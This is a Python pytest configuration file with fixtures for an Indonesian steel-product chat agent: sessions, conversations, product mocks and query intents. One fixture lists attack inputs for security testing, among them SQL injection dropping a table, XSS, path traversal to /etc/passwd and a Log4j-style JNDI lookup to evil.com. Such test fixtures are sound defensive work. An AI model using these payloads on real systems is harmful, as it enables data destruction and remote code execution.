"""Root test configuration with unified fixtures.

This file provides:
1. Pytest fixtures wrapping factories for convenience
2. Shared test utilities
"""

from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Import all factories
from tests.factories import (
    ConversationFactory,
    DTOFactory,
    MessageFactory,
    MockAIAgentFactory,
    MockProductServiceFactory,
    MockRedisFactory,
    ProductFactory,
    ProductWithVariantsFactory,
    QueryIntentFactory,
    SessionFactory,
    TestDataPresets,
    VariantInfoFactory,
)

# =============================================================================
# Domain Fixtures
# =============================================================================


@pytest.fixture
def session():
    """Create test session with default configuration.

    Returns:
        Session: Domain entity with auto-generated ID and current timestamps
    """
    return SessionFactory.create()


@pytest.fixture
def expired_session():
    """Create expired session."""
    return SessionFactory.create(
        last_activity=datetime.now(timezone.utc) - timedelta(hours=25)
    )


@pytest.fixture
def session_with_metadata():
    """Create session with metadata."""
    return SessionFactory.create(
        metadata={
            "browser": "Chrome",
            "browser_version": "120.0.0",
            "ip": "192.168.1.100",
            "location": "Jakarta",
        }
    )


@pytest.fixture
def conversation():
    """Create test conversation."""
    return ConversationFactory.create()


@pytest.fixture
def conversation_with_messages():
    """Create conversation with messages."""
    return ConversationFactory.create_with_messages()


@pytest.fixture
def user_message():
    """Create user message."""
    return MessageFactory.create(sender_type="user")


@pytest.fixture
def ai_message():
    """Create AI message."""
    return MessageFactory.create(
        sender_type="ai_agent", content="Saya bisa membantu Anda"
    )


# =============================================================================
# Product Fixtures (Unified)
# =============================================================================


@pytest.fixture
def product():
    """Create test product (replaces multiple fixtures)."""
    return ProductFactory.create()


@pytest.fixture
def steel_product():
    """Create steel product."""
    return ProductFactory.create_steel_plate()


@pytest.fixture
def minimal_product():
    """Create minimal product."""
    return ProductFactory.create_minimal()


@pytest.fixture
def complete_product():
    """Create complete product."""
    return ProductFactory.create_complete()


@pytest.fixture
def variant():
    """Create test variant."""
    return VariantInfoFactory.create()


@pytest.fixture
def steel_variant():
    """Create steel plate variant."""
    return VariantInfoFactory.create_steel_plate_10mm()


@pytest.fixture
def product_with_variants():
    """Create product with variants."""
    return ProductWithVariantsFactory.create()


@pytest.fixture
def complete_product_with_variants():
    """Create complete product with variants."""
    return ProductWithVariantsFactory.create_complete_product()


# =============================================================================
# Sample Data Fixtures
# =============================================================================


@pytest.fixture
def sample_conversation_context():
    """Create sample conversation context for testing."""
    return [
        {"sender": "user", "content": "Ada plat baja 10mm?"},
        {
            "sender": "ai_agent",
            "content": "Ya, kami punya plat baja 10mm dengan berbagai ukuran",
        },
    ]


@pytest.fixture
def sample_query_intent_product():
    """Create a product inquiry intent."""
    return QueryIntentFactory.create_product_inquiry(
        product_name="plat baja",
        original_query="Ada plat baja 10mm?",
        confidence=0.95,
    )


@pytest.fixture
def sample_query_intent_price():
    """Create a price check intent."""
    return QueryIntentFactory.create_price_check(
        product_name="hollow 40x40",
        original_query="Berapa harga hollow 40x40?",
        confidence=0.98,
        conversation_turn=2,
        query_level="variant",
    )


@pytest.fixture
def sample_query_intent_availability():
    """Create an availability check intent."""
    from src.domain.value_objects.query_intent import ClarificationNeeded

    clarification = ClarificationNeeded(
        attribute_type="dimensions",
        question_template="Spesifikasi ukuran apa yang Anda butuhkan?",
        options=["5mm", "10mm", "15mm"],
        priority=1,
    )

    return QueryIntentFactory.create_availability_check(
        product_name="plat",
        confidence=0.7,
        clarification_stage="narrowing",
        next_action="request_clarification",
        next_clarification=clarification,
    )


@pytest.fixture
def sample_product_info():
    """Create sample product info."""
    return ProductFactory.steel_plate()


@pytest.fixture
def sample_product_with_variants():
    """Create sample product with variants."""
    return ProductWithVariantsFactory.create()


@pytest.fixture
def sample_query_intent_ambiguous():
    """Create an ambiguous query intent."""
    return QueryIntentFactory.create(
        type="general",
        clarification_stage="initial",
        query_level="ambiguous",
        next_action="request_clarification",
        original_query="Saya butuh bahan konstruksi",
        confidence=0.4,
        detected_attributes={},
    )


# =============================================================================
# Mock Fixtures
# =============================================================================


@pytest.fixture
def mock_ai_agent():
    """Create mock AI agent."""
    return MockAIAgentFactory.create()


@pytest.fixture
def mock_product_service():
    """Create mock product service with standard happy-path behavior.

    Returns:
        AsyncMock with search_products and get_product_by_id configured

    Example:
        mock = mock_product_service()
        mock.search_products.return_value = [product1, product2]
    """
    mock = MockProductServiceFactory.create()
    # Add standard behavior specifications
    mock.search_products.return_value = [ProductFactory.create()]
    mock.get_product_by_id.return_value = ProductFactory.create()
    mock.get_product_with_variants.return_value = ProductWithVariantsFactory.create()
    return mock


@pytest.fixture
def mock_redis():
    """Create mock Redis client."""
    return MockRedisFactory.create()


@pytest.fixture
def mock_redis_with_session():
    """Create mock Redis with existing session."""
    return MockRedisFactory.with_session()


@pytest.fixture
def mock_product_service_with_errors():
    """Mock ProductService with various error scenarios.

    Use this fixture for testing error handling and resilience.
    """
    mock = AsyncMock()

    # Network error scenario
    mock.network_error = AsyncMock(side_effect=Exception("Network timeout"))

    # Rate limiting scenario
    mock.rate_limited = AsyncMock(side_effect=Exception("Rate limit exceeded"))

    # Authentication error
    mock.invalid_auth = AsyncMock(side_effect=Exception("Invalid API key"))

    # Database error
    mock.database_error = AsyncMock(side_effect=Exception("Database connection failed"))

    # Partial failure - some methods work, others fail
    mock.search_products = AsyncMock(side_effect=Exception("Search unavailable"))
    mock.get_product_by_id = AsyncMock(return_value=None)  # Returns None for not found

    return mock


@pytest.fixture
def malicious_input_samples():
    """SQL injection, XSS attempts for security testing.

    Returns:
        List of potentially malicious input strings for security validation testing.
    """
    return [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
        "\\x00\\x01\\x02",  # Null bytes
    ]


@pytest.fixture
def mock_query_analyzer():
    """Create mock query analyzer for testing.

    Returns:
        MockQueryAnalyzer: Custom mock with call tracking and state management
        capabilities for testing query analysis workflows.

    Features:
        - Call count tracking
        - Last query/context tracking
        - Configurable analyze mock behavior
        - Reset functionality for test isolation
    """
    from unittest.mock import AsyncMock

    class MockQueryAnalyzer:
        def __init__(self):
            # Core mock for analyze method
            self.analyze_mock = AsyncMock()

            # Tracking attributes
            self.call_count = 0
            self.last_query = None
            self.last_context = None

            # Setup analyze method with tracking
            async def analyze_wrapper(query, conversation_context=None):
                # Track the call
                self.call_count += 1
                self.last_query = query
                self.last_context = conversation_context

                # Call the mock and return its result
                return await self.analyze_mock(query, conversation_context)

            self.analyze = analyze_wrapper

            # Reset method to clear state
            def reset():
                self.call_count = 0
                self.last_query = None
                self.last_context = None
                self.analyze_mock.reset_mock()

            self.reset = reset

    return MockQueryAnalyzer()


@pytest.fixture
def mock_repository():
    """Create generic mock repository."""
    mock = AsyncMock()
    mock._storage = {}

    async def save(entity):
        mock._storage[entity.id] = entity
        return entity

    async def get(entity_id):
        return mock._storage.get(entity_id)

    mock.save = AsyncMock(side_effect=save)
    mock.get = AsyncMock(side_effect=get)
    mock.delete = AsyncMock(return_value=True)

    return mock


# =============================================================================
# DTO Fixtures
# =============================================================================


@pytest.fixture
def session_dto():
    """Create session DTO."""
    return DTOFactory.create_session_dto()


@pytest.fixture
def message_dto():
    """Create message DTO."""
    return DTOFactory.create_message_dto()


@pytest.fixture
def conversation_dto():
    """Create conversation DTO."""
    return DTOFactory.create_conversation_dto()


@pytest.fixture
def product_query_dto():
    """Create product query DTO."""
    return DTOFactory.create_product_query_dto()


@pytest.fixture
def product_response_dto():
    """Create product response DTO."""
    return DTOFactory.create_product_response_dto()


# =============================================================================
# Query Intent Fixtures
# =============================================================================


@pytest.fixture
def product_inquiry_intent():
    """Create product inquiry intent."""
    return QueryIntentFactory.product_inquiry()


@pytest.fixture
def price_check_intent():
    """Create price check intent."""
    return QueryIntentFactory.price_check()


@pytest.fixture
def availability_check_intent():
    """Create availability check intent."""
    return QueryIntentFactory.availability_check()


@pytest.fixture
def general_intent():
    """Create general query intent."""
    return QueryIntentFactory.create(confidence=0.85)


# =============================================================================
# Test Data Presets
# =============================================================================


@pytest.fixture(scope="session")
def test_data_presets():
    """Get test data presets."""
    return TestDataPresets


@pytest.fixture
def mock_conversation_repository():
    """Mock conversation repository with proper conversation handling."""
    mock = AsyncMock()
    mock._storage = {}
    mock._session_map = {}

    async def save(conversation):
        mock._storage[conversation.id] = conversation
        mock._session_map[conversation.session_id] = conversation
        return conversation

    async def get(conversation_id):
        return mock._storage.get(conversation_id)

    async def get_by_session(session_id):
        return mock._session_map.get(session_id)

    mock.save = AsyncMock(side_effect=save)
    mock.get = AsyncMock(side_effect=get)
    mock.get_by_session = AsyncMock(side_effect=get_by_session)
    mock.delete = AsyncMock(return_value=True)

    return mock


# =============================================================================
# Test Utilities
# =============================================================================


@pytest.fixture(scope="session")
def anyio_backend():
    """Configure async backend for pytest-anyio."""
    return "asyncio"


@pytest.fixture(scope="function")
def reset_factories():
    """Reset factory counters between tests."""
    # Reset any factory state if needed
    yield
    # Cleanup after test


# =============================================================================
# Application-Specific Fixtures for Migration Compatibility
# =============================================================================


@pytest.fixture
def mock_message_repository(mock_repository):
    """Mock message repository for application layer tests."""
    return mock_repository


@pytest.fixture
def mock_product_repository():
    """Mock product repository for application layer tests."""
    mock = AsyncMock()
    mock.get_by_id = AsyncMock(return_value=ProductFactory.create_steel_plate())
    mock.search = AsyncMock(return_value=[ProductFactory.create_steel_plate()])
    return mock


@pytest.fixture
def mock_cache_service():
    """Mock cache service for application layer tests."""
    mock = AsyncMock()
    mock.get = AsyncMock(return_value=None)
    mock.set = AsyncMock(return_value=True)
    mock.delete = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def query_analyzer_service(mock_query_analyzer):
    """Create QueryAnalyzerService with mocked dependencies."""
    from src.application.services.query_analyzer import QueryAnalyzerService

    return QueryAnalyzerService(query_analyzer=mock_query_analyzer)


@pytest.fixture
def sample_query_analyzer_messages():
    """Create sample conversation messages for query analyzer testing."""
    return [
        DTOFactory.create_message_dto(
            content="Saya mencari besi hollow",
            sender_type="user",
            timestamp=datetime(2024, 1, 1, 10, 0, 0, tzinfo=timezone.utc),
        ),
        DTOFactory.create_message_dto(
            content=(
                "Kami memiliki berbagai ukuran besi hollow. "
                "Ukuran apa yang Anda cari?"
            ),
            sender_type="ai_agent",
            timestamp=datetime(2024, 1, 1, 10, 0, 30, tzinfo=timezone.utc),
        ),
        DTOFactory.create_message_dto(
            content="Yang ukuran 4x4",
            sender_type="user",
            timestamp=datetime(2024, 1, 1, 10, 1, 0, tzinfo=timezone.utc),
        ),
    ]


@pytest.fixture
def sample_query_intent_with_clarification():
    """Create a query intent with clarification needed."""
    from src.domain.value_objects.query_intent import ClarificationNeeded

    clarification = ClarificationNeeded(
        attribute_type="dimensions",
        question_template="Ukuran {attribute_type} apa yang Anda butuhkan?",
        options=["2x2", "3x3", "4x4", "5x5"],
        priority=1,
    )

    return QueryIntentFactory.create(
        type="product_inquiry",
        clarification_stage="narrowing",
        query_level="product",
        next_action="provide_info",
        next_clarification=clarification,
        response_data={
            "product_name": "besi hollow",
            "available_sizes": ["2x2", "3x3", "4x4", "5x5"],
        },
        original_query="Saya mencari besi hollow",
        current_query="Yang ukuran 4x4",
        confidence=0.85,
        requires_human_intervention=False,
        suggested_response=(
            "Kami memiliki besi hollow ukuran 4x4 tersedia. "
            "Apakah Anda ingin mengetahui harga atau informasi lebih lanjut?"
        ),
        detected_attributes={"type": "hollow", "material": "besi", "size": "4x4"},
        conversation_turn=3,
    )


# =============================================================================
# Composite Fixtures
# =============================================================================


@pytest.fixture
def chat_agent_with_mocked_llm():
    """Create ChatAgent with mocked LLM calls for testing.

    Returns:
        ChatAgent instance with mocked agent.run method
    """
    from src.infrastructure.ai.chat_agent import ChatAgent

    with patch.dict("os.environ", {"OPENAI_API_KEY": "test-key"}):
        with patch("src.infrastructure.ai.chat_agent.Agent"):
            with patch("src.infrastructure.ai.chat_agent.OpenAIChatModel"):
                agent = ChatAgent()
                agent.agent = MagicMock()

                # Create a proper mock result with .output attribute
                mock_result = MagicMock()
                mock_result.output = "Saya akan membantu Anda"

                # Configure AsyncMock to return the result
                agent.agent.run = AsyncMock(return_value=mock_result)
                return agent


@pytest.fixture
def chat_agent_test_context(mock_product_service, mock_redis, product_with_variants):
    """Complete test context for ChatAgent tests.

    Provides a fully configured testing environment with all necessary mocks
    and sample data for comprehensive ChatAgent testing.

    Returns:
        dict: Contains product_service, redis, sample_data, and agent instance
    """
    from src.infrastructure.ai.chat_agent import ChatAgent

    with patch.dict("os.environ", {"OPENAI_API_KEY": "test-key"}):
        with patch("src.infrastructure.ai.chat_agent.Agent"):
            with patch("src.infrastructure.ai.chat_agent.OpenAIChatModel"):
                return {
                    "product_service": mock_product_service,
                    "redis": mock_redis,
                    "sample_data": product_with_variants,
                    "agent": ChatAgent.create_with_fallback(),
                }


@pytest.fixture(
    params=[0, 50, 100, 1000],
    ids=["no_stock", "low_stock", "normal_stock", "high_stock"],
)
def product_with_stock_levels(request):
    """Create product with parameterized stock levels for edge case testing.

    Args:
        request: Pytest request object with stock level parameter

    Returns:
        VariantInfo with specified stock quantity
    """
    return VariantInfoFactory.create(stock_quantity=request.param)


@pytest.fixture
def large_product_catalog():
    """Generate large dataset for performance testing.

    Creates 100 products with multiple variants each for testing
    pagination, search performance, and memory handling.
    """
    products = []
    for i in range(100):
        product = ProductFactory.create(
            product_id=f"prod-{i}",
            product_name=f"Product {i}",
            variant_count=5,
        )
        products.append(product)
    return products


@pytest.fixture
def mock_assertion_helpers():
    """Helper class for common mock assertions.

    Provides utility methods for verifying mock behavior patterns
    across different test scenarios.
    """

    class MockAssertions:
        @staticmethod
        def assert_called_with_retry(mock, expected_calls=3):
            """Assert mock was called with retry logic."""
            assert (
                mock.call_count == expected_calls
            ), f"Expected {expected_calls} calls, got {mock.call_count}"

        @staticmethod
        def assert_error_handled(mock_service, mock_logger=None):
            """Assert error was properly handled."""
            mock_service.assert_called()
            if mock_logger:
                mock_logger.error.assert_called()

        @staticmethod
        def assert_cached_response(mock_cache, cache_key):
            """Assert response was cached."""
            mock_cache.set.assert_called()
            call_args = mock_cache.set.call_args
            assert call_args[0][0] == cache_key

    return MockAssertions()


# =============================================================================
# Additional Application Layer Fixtures for Use Case Tests
# =============================================================================


@pytest.fixture
def mock_conversation_repository_async():
    """Mock async conversation repository for application layer tests."""
    mock = AsyncMock()
    mock.save = AsyncMock()
    mock.get = AsyncMock()
    mock.get_by_session = AsyncMock()
    mock.delete = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def sample_conversation_detailed():
    """Create a detailed conversation with messages for testing."""
    from datetime import datetime, timezone

    conversation = ConversationFactory.create(
        id="conv-123",
        session_id="session-456",
        started_at=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
        last_activity=datetime(2024, 1, 15, 11, 0, 0, tzinfo=timezone.utc),
        metadata={"source": "web", "user_agent": "test-browser"},
    )

    # Add messages
    user_msg = MessageFactory.create(
        id="msg-1",
        content="Hello, I need help with steel products",
        sender_type="user",
        conversation_id="conv-123",
        created_at=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
        metadata={"language": "en"},
    )

    ai_msg = MessageFactory.create(
        id="msg-2",
        content="Hello! I'd be happy to help you with steel products.",
        sender_type="ai_agent",
        conversation_id="conv-123",
        created_at=datetime(2024, 1, 15, 10, 0, 30, tzinfo=timezone.utc),
        metadata={},
    )

    conversation.messages = [user_msg, ai_msg]
    return conversation


@pytest.fixture
def sample_conversation_empty():
    """Create an empty conversation without messages."""
    from datetime import datetime, timezone

    return ConversationFactory.create(
        id="conv-empty",
        session_id="session-empty",
        started_at=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
        last_activity=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
        metadata={},
        messages=[],
    )


@pytest.fixture
def sample_conversation_many_messages():
    """Create a conversation with many messages for ordering tests."""
    from datetime import datetime, timezone

    conversation = ConversationFactory.create(
        id="conv-many",
        session_id="session-ordered",
        started_at=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
    )

    messages = []
    for i in range(5):
        msg = MessageFactory.create(
            id=f"msg-{i}",
            content=f"Message {i}",
            sender_type="user" if i % 2 == 0 else "ai_agent",
            conversation_id="conv-many",
            created_at=datetime(2024, 1, 15, 10, i, 0, tzinfo=timezone.utc),
        )
        messages.append(msg)

    conversation.messages = messages
    return conversation


@pytest.fixture
def sample_conversation_with_messages():
    """Create conversation with standard test messages."""
    from datetime import datetime, timezone

    conversation = ConversationFactory.create(
        id="conv-with-msgs",
        session_id="test-session-123",
        started_at=datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc),
        last_activity=datetime(2024, 1, 15, 10, 1, 0, tzinfo=timezone.utc),
        metadata={"test": "data"},
    )

    user_msg = MessageFactory.create(
        content="Previous user message",
        sender_type="user",
        conversation_id="conv-with-msgs",
    )

    ai_msg = MessageFactory.create(
        content="Previous AI response",
        sender_type="ai_agent",
        conversation_id="conv-with-msgs",
    )

    conversation.messages = [user_msg, ai_msg]
    return conversation


@pytest.fixture
def mock_pydantic_ai_agent():
    """Mock PydanticAI agent for testing."""
    mock = AsyncMock()
    mock.run = AsyncMock(return_value="This is a PydanticAI response")
    return mock


@pytest.fixture
def mock_redis_adapter():
    """Mock Redis adapter for session management."""
    mock = AsyncMock()
    mock._storage = {}

    class MockRedisClient:
        def __init__(self, storage):
            self._storage = storage
            self._expiry = {}  # Track TTL settings

        async def get(self, key):
            return self._storage.get(key)

        async def setex(self, key, ttl, value):
            self._storage[key] = value
            self._expiry[key] = ttl  # Track the TTL
            return True

        async def ttl(self, key):
            # Return a positive TTL if key exists
            return 3600 if key in self._storage else -2

    mock_client = MockRedisClient(mock._storage)
    mock.get_client = AsyncMock(return_value=mock_client)
    mock._client = mock_client  # Store reference for tests
    return mock


@pytest.fixture
def mock_redis_client(mock_redis_adapter):
    """Get the mock redis client from the adapter."""
    return mock_redis_adapter._client


@pytest.fixture
def mock_start_chat_session():
    """Mock StartChatSessionUseCase for interface tests."""
    from src.application.use_cases.interfaces import StartChatSessionUseCase

    class MockStartChatSession(StartChatSessionUseCase):
        def __init__(self):
            self.execute_mock = AsyncMock()
            self.call_count = 0
            self.last_call_args = {}

        async def execute(self, session_id, metadata=None):
            self.call_count += 1
            self.last_call_args = {"session_id": session_id, "metadata": metadata}
            return await self.execute_mock(session_id, metadata)

    return MockStartChatSession()


@pytest.fixture
def mock_process_message():
    """Mock ProcessUserMessageUseCase for interface tests."""
    from src.application.use_cases.interfaces import ProcessUserMessageUseCase

    class MockProcessMessage(ProcessUserMessageUseCase):
        def __init__(self):
            self.execute_mock = AsyncMock()
            self.call_count = 0
            self.last_call_args = {}

        async def execute(self, session_id, content, metadata=None):
            self.call_count += 1
            self.last_call_args = {
                "session_id": session_id,
                "content": content,
                "metadata": metadata,
            }
            return await self.execute_mock(session_id, content, metadata)

    return MockProcessMessage()


@pytest.fixture
def mock_get_conversation():
    """Mock GetConversationUseCase for interface tests."""
    from src.application.use_cases.interfaces import GetConversationUseCase

    class MockGetConversation(GetConversationUseCase):
        def __init__(self):
            self.execute_mock = AsyncMock()
            self.call_count = 0
            self.last_call_args = {}

        async def execute(self, session_id):
            self.call_count += 1
            self.last_call_args = {"session_id": session_id}
            return await self.execute_mock(session_id)

    return MockGetConversation()


@pytest.fixture
def sample_session_dto():
    """Create sample session DTO for testing."""
    return DTOFactory.create_session_dto()


@pytest.fixture
def sample_message_dto():
    """Create sample message DTO for testing."""
    return DTOFactory.create_message_dto()


@pytest.fixture
def sample_conversation_dto():
    """Create sample conversation DTO for testing."""
    return DTOFactory.create_conversation_dto()
